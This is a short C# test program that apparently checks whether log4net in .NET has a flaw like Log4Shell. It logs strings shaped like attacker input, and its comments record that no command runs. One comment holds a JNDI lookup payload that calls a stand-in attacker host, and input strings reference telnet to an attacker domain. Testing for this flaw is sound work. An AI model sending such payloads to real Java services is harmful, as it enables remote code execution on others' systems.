using log4net;
using log4net.Config;
using log4net.Core;
using System;
using System.IO;
using System.Reflection;

namespace log4shellNetRepro
{
    /// <summary>
    /// https://jakubwajs.wordpress.com/2019/11/28/logging-with-log4net-in-net-core-3-0-console-app/
    /// </summary>
    class Program
    {
        private static readonly ILog Log = LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

        static void Main(string[] args)
        {
            Setup();

            var attackerInput = "telnet my-attacker.com";

            // This line triggers the RCE by logging the attacker-controlled input.
            // The attacker can set their input to: ${jndi:ldap://attacker.com/a}
            Log.Info($"field attacker used :{attackerInput}");
            Log.Info($"{attackerInput}");

            attackerInput = "mkdir hacked";
            Log.Debug(attackerInput);
            // if the input is executed as a shell script like it is in Java,
            // then we should see a directory 'hacked' in the .net5/debug directory
            // (which we don't)
        }

        public static void Setup()
        {
            // Load configuration
            var logRepository = LogManager.GetRepository(Assembly.GetEntryAssembly());
            XmlConfigurator.Configure(logRepository, new FileInfo("log4net.config"));
        }
    }
}
